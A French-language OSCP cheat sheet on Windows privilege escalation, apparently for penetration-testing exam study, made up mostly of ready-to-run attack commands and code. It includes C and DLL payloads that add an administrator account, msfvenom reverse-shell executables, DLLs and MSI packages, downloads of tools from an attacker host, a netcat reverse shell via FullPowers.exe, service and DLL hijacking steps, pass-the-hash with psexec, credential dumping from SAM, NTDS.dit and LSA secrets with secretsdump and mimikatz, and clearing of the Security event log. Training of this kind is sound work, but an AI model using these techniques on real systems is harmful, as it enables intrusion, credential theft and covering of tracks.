---
title: "OSCP · Élévation de privilèges Windows"
description: "Auditer les services, jetons et configurations d'un poste Windows."
---

# OSCP · Élévation de privilèges Windows

Auditer les services, jetons et configurations d'un poste Windows.


## Énumération


**Utilisateur et nom de la machine**


<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>

```text
whoami
```


**Paramètres et repères :**
`Get-LocalUser`  


**Utilisateurs locaux**


**Paramètres et repères :**
`Get-LocalGroup`  


**Groupes locaux**


<p class="oscp-command-note">Lister les groupes locaux Windows.</p>

```text
net localgroup
```


<p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>

```powershell
Get-LocalGroupMember -GroupName [GroupName]
```


**Système, version et architecture**


<p class="oscp-command-note">Afficher la version et la configuration de Windows.</p>

```text
systeminfo
```


**Configuration réseau**


<p class="oscp-command-note">Afficher la configuration réseau Windows.</p>

```text
ipconfig /all
```


<p class="oscp-command-note">Afficher ou modifier les routes réseau.</p>

```text
route print
```


<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```text
netstat -ano
```


**Logiciels installés**


<p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
```


<p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>

```sql
Select-Object -Property DisplayName
```


<p class="oscp-command-note">Lister les logiciels installés depuis le Registre.</p>

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
```


<p class="oscp-command-note">Sélectionner les propriétés de la sortie PowerShell.</p>

```sql
Select-Object -Property DisplayName
```


**Paramètres et repères :**
`Get-Process`  


**Processus actifs**




```sql
Select-Object -Property ProcessName, Path
```


**Comptes de service**


<p class="oscp-command-note">Examiner les informations système WMI.</p>

```powershell
Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
```


**Tâches planifiées**


<p class="oscp-command-note">Lister les tâches planifiées Windows.</p>

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```


**Membres du groupe Administrateurs**


<p class="oscp-command-note">Afficher les membres d&#x27;un groupe local.</p>

```powershell
Get-LocalGroupMember -GroupName "Administrators"
```


**Lecteurs et volumes**


<p class="oscp-command-note">Lister les lecteurs PowerShell.</p>

```powershell
Get-PSDrive -PSProvider FileSystem
```


**Version de PowerShell**




```text
$PSVersionTable.PSVersion
```


## Recherche de fichiers


<p class="oscp-command-note">Rechercher des fichiers avec PowerShell.</p>

```powershell
Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# Other good foder to heck for things are the web root folders, either Windows or Linux, for example in Windows (C:\inetpub\wwwroot) some config files could have hardcoded strings.
```


```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { 
    (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }
}
```


```powershell
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length
```


```bash
Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
    (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }
}
```


**Paramètres et repères :**
`Runas`  




```powershell
# Replace [Domain\Username] with the target username (e.g., backupadmin). You will be prompted to enter the password for the specified user.
runas /user:[Domain\Username] cmd
```


## Journaux PowerShell

Observer les permissions et la configuration de Windows.


**Paramètres et repères :**
`Get-History`  




```powershell
(Get-PSReadlineOption).HistorySavePath
```


```powershell
$userProfiles = Get-ChildItem -Path C:\Users -Directory

foreach ($profile in $userProfiles) {
    $historyPath = Join-Path -Path $profile.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    
    if (Test-Path $historyPath) {
        Write-Output "User: $($profile.Name)"
        Write-Output "PSReadline History Path: $historyPath"
        Write-Output "--------------------------------"
        Get-Content -Path $historyPath
        Write-Output ""
    }
}
```


### Vérifier les privilèges


<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>

```powershell
whoami /priv
```


### Enable All Tokens




```powershell
.\EnableAllTokenPrivs.ps1
whoami /priv
```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Enable All Tokens ».</p>

```powershell
## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
$definition = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Set_TokenPermission
{
    public class SetTokenPriv
    {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static void EnablePrivilege()
        {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr();
            hproc = Process.GetCurrentProcess().Handle;
            IntPtr htok = IntPtr.Zero;

            List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
            "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
            "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
            "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
            "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
            "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
            "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
            "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
            "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };


            

            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;

            foreach (var priv in privs)
            {
                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
            }
        }
    }  
}
'@

$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege() 2>&1
```


### Tableau des privilèges


**Paramètres et repères :**
`SeAssignPrimaryToken`  


**SeAssignPrimaryToken**


**Paramètres et repères :**
`SeAudit`  


**SeAudit**




```text
Authz Report Security Event
```


**Paramètres et repères :**
`SeBackup`  


**SeBackup**




```text
HKLM\SAM
```


```text
HKLM\SYSTEM
```


**Paramètres et repères :**
`SAM` · `Administrators` · `SeBackupPrivilege`  


**Paramètres et repères :**
`SeBackup` · `SeRestore`  


**SeBackup**




```text
HKLM\SAM
```


```text
HKLM\SYSTEM
```




```text
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
```


**Paramètres et repères :**
`SAM` · `Impacket` · `secretsdump.py`  


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```text
secretsdump.py -sam SAM -system SYSTEM LOCAL
```


**Paramètres et repères :**
`Administrator` · `Administrators` · `NTLM` · `Impacket`  
`psexec.py`  


<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>

```text
psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
```




```text
robocopy /b
```




```text
User Account Control
```


**Paramètres et repères :**
`Administrator` · `FilterAdministratorToken` · `SMB` · `NetBIOS`  
`WinRM` · `RDP`  




```text
Restricted Admin
```




```text
%WINDIR%\MEMORY.DMP
```


**Paramètres et repères :**
`SeBackupPrivilege` · `SeBackup` · `SeRestore` · `/b`  




```text
Backup Operators
```


**Paramètres et repères :**
`Copy-FileSeBackupPrivilege` · `SeBackup`  


<p class="oscp-command-note">Charger un module PowerShell.</p>

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```


```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```


**Paramètres et repères :**
`Set-SeBackupPrivilege`  




```text
Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
```


**Paramètres et repères :**
`SeChangeNotify`  


**SeChangeNotify**


**Paramètres et repères :**
`SeCreateGlobal`  


**SeCreateGlobal**


**Paramètres et repères :**
`SeCreatePagefile`  


**SeCreatePagefile**


**Paramètres et repères :**
`SeCreatePermanent`  


**SeCreatePermanent**


**Paramètres et repères :**
`SeCreateSymbolicLink`  


**SeCreateSymbolicLink**


**Paramètres et repères :**
`SeCreateToken` · `NtCreateToken`  


**SeCreateToken**


**Paramètres et repères :**
`SeDebug` · `lsass.exe`  


**SeDebug**


**Paramètres et repères :**
`SeDelegateSession-` · `UserImpersonate`  


**SeDelegateSession- UserImpersonate**


**Paramètres et repères :**
`SeEnableDelegation`  


**SeEnableDelegation**


**Paramètres et repères :**
`SeImpersonate` · `SeAssignPrimaryToken`  


**SeImpersonate**


**Paramètres et repères :**
`SeIncreaseBasePriority`  


**SeIncreaseBasePriority**




```text
start /realtime SomeCpuIntensiveApp.exe
```


**Paramètres et repères :**
`SeIncreaseQuota`  


**SeIncreaseQuota**


**Paramètres et repères :**
`SeIncreaseWorkingSet`  


**SeIncreaseWorkingSet**


**Paramètres et repères :**
`SeLoadDriver` · `szkg64.sys` · `fltMC`  


**SeLoadDriver**




```text
fltMC sysmondrv
```


**Paramètres et repères :**
`szkg64`  


**Paramètres et repères :**
`SeLockMemory`  


**SeLockMemory**


**Paramètres et repères :**
`SeMachineAccount`  


**SeMachineAccount**


**Paramètres et repères :**
`SeManageVolume`  


**SeManageVolume**




```text
SYNCHRONIZE | FILE_TRAVERSE
```


**Paramètres et repères :**
`FSCTL_SD_GLOBAL_CHANGE` · `S-1-5-32-544` · `S-1-5-32-545`  


**Paramètres et repères :**
`SeProfileSingleProcess`  


**SeProfileSingleProcess**


**Paramètres et repères :**
`SeRelabel` · `WRITE_OWNER`  


**SeRelabel**


**Paramètres et repères :**
`SeRemoteShutdown`  


**SeRemoteShutdown**




```text
shutdown /s /f /m \\server1 /d P:5:19
```


**Paramètres et repères :**
`SeReserveProcessor`  


**SeReserveProcessor**


**Paramètres et repères :**
`SeRestore`  


**SeRestore**


**Paramètres et repères :**
`SeSecurity`  


**SeSecurity**




```text
wevtutil cl Security
```


```text
wevtutil sl Security /ms:0
```


**Paramètres et repères :**
`SeShutdown`  


**SeShutdown**




```text
shutdown.exe /s /f /t 1
```


**Paramètres et repères :**
`SeSyncAgent`  


**SeSyncAgent**


**Paramètres et repères :**
`SeSystemEnvironment` · `NtSetSystemEnvironmentValue` · `NtModifyDriverEntry`  


**SeSystemEnvironment**


**Paramètres et repères :**
`SeSystemProfile`  


**SeSystemProfile**


**Paramètres et repères :**
`SeSystemtime`  


**SeSystemtime**




```text
cmd.exe /c date 01-01-01
```


```text
cmd.exe /c time 00:00
```


**Paramètres et repères :**
`SeSystemTime`  


**Paramètres et repères :**
`SeTakeOwnership`  


**SeTakeOwnership**




```text
takeown.exe /f "%windir%\system32"
```




```text
icacls.exe "%windir%\system32" /grant "%username%":F
```


**Paramètres et repères :**
`SeTcb`  


**SeTcb**


**Paramètres et repères :**
`SeTimeZone`  


**SeTimeZone**




```text
tzutil /s "Chatham Islands Standard Time"
```


**Paramètres et repères :**
`SeTrustedCredManAccess`  


**SeTrustedCredManAccess**


**Paramètres et repères :**
`SeUndock`  


**SeUndock**


**Paramètres et repères :**
`SeUnsolicitedInput`  


**SeUnsolicitedInput**


### FullPowers.exe


**Paramètres et repères :**
`FullPowers.exe` · `SeAssignPrimaryToken` · `SeImpersonate`  


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 -m http.server 80
```

![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)


<p class="oscp-command-note">Script PowerShell dans la rubrique « FullPowers.exe ».</p>

```powershell
# CMD
cerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe

# PowerShell
iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
```

![Downloading FullPowers.exe to victim machine.](https://www.emmanuelsolis.com/img/fullpowers_2.png)


**Paramètres et repères :**
`FullPowers.exe`  




```powershell
# Basic Usage
./FullPowers.exe

# Trying to get an extended set of privileges (might fail with NETWORK SERVICE)
./FullPowers.exe -x

# Specify a command line to run
./FullPowers.exe -c "powershell -ep Bypass"

# Start a reverse shell to the attacker machine (requires that you previously bring Netcat to the victim)
./FullPowers.exe -c "C:\Temp\nc64.exe [kali_ip] [port] -e cmd" -z
```

![Running FullPowers.exe.](https://www.emmanuelsolis.com/img/fullpowers_3.png)


**Paramètres et repères :**
`FullPowers.exe`  


<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>

```powershell
whoami /priv
```

![Verifying our New Restored Privileges.](https://www.emmanuelsolis.com/img/fullpowers_4.png)


**Paramètres et repères :**
`SeImpersonate` · `PrintSpoofer.exe` · `GodPotato.exe`  

![Executing Malicious Actions.](https://www.emmanuelsolis.com/img/fullpowers_5.png)


### Vérifications principales


<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>

```powershell
# Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
```


<p class="oscp-command-note">Vérifier les permissions NTFS.</p>

```powershell
icacls "C:\Path\To\ServiceBinary.exe"
```


<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
```




```text
#include <stdlib.h>

int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}
```




```bash
# Cross-Compile the C Code to a 64-bit Application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# For 64-bit executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe

# For 32-bit executable
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
```


**Paramètres et repères :**
`msfvenom`  


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
# Remember to run the HTTP server on your Kali to be able to bring the binary.
iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe

move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"

move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
```




```powershell
Restart-Service -Name '<ServiceName>'
```


**Paramètres et repères :**
`sc.exe`  




```powershell
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```


<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>

```powershell
# First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
whoami /priv

# Perform the restart
shutdown /r /t 0
```


### Vérifications complémentaires


<p class="oscp-command-note">Copier les fichiers indiqués.</p>

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name '<ServiceName>'
```




```powershell
$ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal
```


<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>

```powershell
Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
    $path = $_.PathName -replace '"', ''
    if (Test-Path $path) {
        icacls $path
    }
}
```


```powershell
# List service dependencies
Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}
```


<p class="oscp-command-note">Vérifier les permissions NTFS.</p>

```powershell
# Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file
icacls "C:\Path\To\Service\ConfigFile.ini"
```


**Paramètres et repères :**
`impacket-tool`  


<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>

```bash
strings [downloaded_binary]

flare-floss [downloaded_binary]

# Use dnSpy if you know that the binary was built using .NET.

# You could also use tools like PEiD, IDA Pro, or Ghidra to analyze the binary (this is not recommended because the exam is usually not that complex and you could be going into a rabbit hole).
```




```powershell
Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
```




```powershell
# Check for system update settings that might revert changes
Get-WindowsUpdateLog
```


## Chargement de DLL par un service


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32</code></p>


```text
C:\Windows\System32\System
```


```text
C:\Windows
```


**Paramètres et repères :**
`PATH` · `ProcMon` · `depends.exe`  


<p class="oscp-command-note">Examiner les propriétés CIM du système.</p>

```powershell
# List running services and their executable paths
Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
```


**Paramètres et repères :**
`PATH`  




```powershell
# Display the PATH environment variable
$env:path
```




```text
#include <windows.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,       // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved      // Reserved
) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Execute system commands to add a new user and grant admin rights
        system("net user emma Password123! /add");
        system("net localgroup administrators emma /add");
    }
    return TRUE;
}
```




```bash
# Cross-Compile the DLL
x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
```


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# For 64-bit DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll

# For 32-bit DLL
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
```


**Paramètres et repères :**
`msfvenom`  


<p class="oscp-command-note">Script PowerShell dans la rubrique « Chargement de DLL par un service ».</p>

```powershell
# Bring the file from your Kali using an HTTP server

# Move the original DLL (back it up if necessary)
move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"

# Replace it with your malicious DLL
move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"

# Restart the service
Restart-Service -Name "[serviceToHijack]"
```


<p class="oscp-command-note">Examiner les comptes utilisateurs Windows.</p>

```powershell
# List users to check if the new user was added
net user

# List local administrators to verify if the new user is an admin
net localgroup administrators
```




```powershell
# Display the PATH environment variable
$env:path
```


## Chemins de services sans guillemets


<p class="oscp-command-note">Interroger les informations système via WMI.</p>

```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\MyApp\app.exe</code></p>


```text
C:\Program Files\MyApp\app.exe
```


**Paramètres et repères :**
`.exe`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program.exe</code></p>


```text
C:\Program Files\MyApp.exe
```


```text
C:\Program Files\MyApp\app.exe
```


```text
C:\Program Files\
```


**Paramètres et repères :**
`app.exe`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Program Files\ExampleApp\ExampleService.exe</code></p>


```text
C:\Program.exe
```


<p class="oscp-command-note">Vérifier les permissions NTFS.</p>

```powershell
icacls "<PathToDirectory>"
```


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
# Download PowerUp script
iwr http://<YourServerIP>/PowerUp.ps1 -Outfile PowerUp.ps1

# Bypass execution policy and run the script
powershell -ep bypass
. .\PowerUp.ps1

# List unquoted service paths
Get-UnquotedService
```


<p class="oscp-command-note">Script PowerShell dans la rubrique « Chemins de services sans guillemets ».</p>

```powershell
# Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.

# Replace service binary with malicious executable (Manually)
copy <malicious_file> "C:\Program Files\ExampleApp\Current.exe"

# Replace service binary with malicious executable (with PowerUp)
Write-ServiceBinary -Name '<ServiceName>' -Path '<PathToMaliciousExecutable>'

# Restart the service
Restart-Service <ServiceName>

# Verify the service status
Get-Service -Name '<ServiceName>'

# Check event logs for service-related events
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}
```


## Tâches planifiées


<p class="oscp-command-note">Examiner les tâches planifiées Windows.</p>

```powershell
schtasks /query /fo LIST /v
```


<p class="oscp-command-note">Vérifier les permissions NTFS.</p>

```powershell
icacls "C:\Path\To\ScheduledTaskExecutable.exe"
```


<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>

```powershell
iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe

move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak

move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
```


### Connexions réseau actives


<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```bash
netstat -ano

# Example output:
Proto  Local address      Remote address     State        PID
tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       -
tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       -
tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    -
tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  -
udp    0.0.0.0:135        0.0.0.0:*                       -
udp    192.168.1.9:500    0.0.0.0:*                       -
```


## Cleartext Password Finding

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Using Findstr




```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```


### Searching in Configuration Files


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
dir /s *pass* == *cred* == *vnc* == *.config*
```


### Searching in All Files




```bash
findstr /spin "password" *.*
findstr /spin "password" *.*
```


### Check Specific Files


<p class="oscp-command-note">Script shell dans la rubrique « Check Specific Files ».</p>

```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```


### Searching for VNC Fichiers de mots de passe


<p class="oscp-command-note">Lister les fichiers du répertoire.</p>

```bash
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```


## Shadow Copies (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)


**Paramètres et repères :**
`Windows.Old` · `SYSTEM` · `SAM` · `NTDS.dit`  
`SECURITY` · `NTUSER.dat`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\SAM</code></p>


```text
C:\windows.old\Windows\System32\SAM
```


**Paramètres et repères :**
`impacket-tool`  


### Dumping SAM and SYSTEM Files


<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg save hklm\sam <destination_path>\sam
```


```powershell
reg save hklm\system <destination_path>\system
```




```bash
samdump2 <system_file> <sam_file>
# Autre possibilité
impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
```


### Accessing NTDS.dit (Active Directory Database)

Examiner les objets, les droits et les services du domaine.




```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
```




```powershell
reg.exe save hklm\system <destination_path>\system.bak
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
```


### Dumping SECURITY Hive for LSA Secrets & Cached Credentials

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg save hklm\security <destination_path>\security
```


```powershell
reg save hklm\system <destination_path>\system
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
impacket-secretsdump -security <security_file> -system <system_file> LOCAL
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
```


### Extracting User-Specific Credentials from NTUSER.dat

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`NTUSER.dat`  


<p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Users\&lt;username&gt;\NTUSER.dat</code></p>


<p class="oscp-command-note">Consulter ou modifier une clé de Registre.</p>

```powershell
reg load hku\TempHive <path_to_ntuser.dat>
```


### General Volume Shadow Copy Access




```powershell
vssadmin list shadows
```




```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
```


## AlwaysElevated Registry Check

Observer les permissions et la configuration de Windows.


**Paramètres et repères :**
`HKEY_LOCAL_MACHINE` · `HKEY_CURRENT_USER` · `1`  


### How to Check for the Vulnerability


<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>

```powershell
# Check in HKEY_LOCAL_MACHINE for system-wide policy
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Check in HKEY_CURRENT_USER for user-specific policy
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```


### Interpreting the Results


**Paramètres et repères :**
`1`  


### Exploiting the Vulnerability


**Paramètres et repères :**
`1`  


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f msi -o malicious.msi
```


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
# Using Netcat
nc -lvnp <your_port>

# Using Metasploit (forbidden in the exam)
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
run
```


**Paramètres et repères :**
`msiexec`  


<p class="oscp-command-note">Script shell dans la rubrique « Exploiting the Vulnerability ».</p>

```bash
# If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps
./malicious.msi

# This will install and execute the malicious MSI with system-level permissions, allowing you to escalate your privileges.
msiexec /quiet /qn /i malicious.msi

# The /quiet and /qn flags ensure that the installation runs silently without user interaction
# The /i flag specifies that you're installing the MSI package.
```


### WinPEAS




```powershell
.\winPEAS.ps1
```


```powershell
.\winPEAS.ps1 | tee winpeas_output.txt
```


```powershell
.\winPEAS.ps1 | Out-File -FilePath winpeas_output.txt
```


<p class="oscp-command-note">Exécuter un script Python.</p>

```powershell
# 1. Download file from victim to local Kali, we could use techniques from section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./winpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# (Optional) We could also convert it to PDF.
python3 json2pdf.py peass.json peass.pdf
```




```powershell
Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
```


### PowerUp




```powershell
.\powerup.ps1
```


```powershell
.\PowerUp.ps1 -CheckMissingPatches
```


```powershell
.\PowerUp.ps1 -UnquotedServicePaths
```


```powershell
.\PowerUp.ps1 -CheckWritableServices
```


```powershell
.\PowerUp.ps1 -ScheduledTasks
```


```powershell
.\PowerUp.ps1 -WeakFilePermissions
```


```powershell
.\PowerUp.ps1 -AutoDownloadBinaries
```


### PowerCat




```powershell
.\powercat.ps1 -c [target_IP] -p [port] -e [command]
```


```powershell
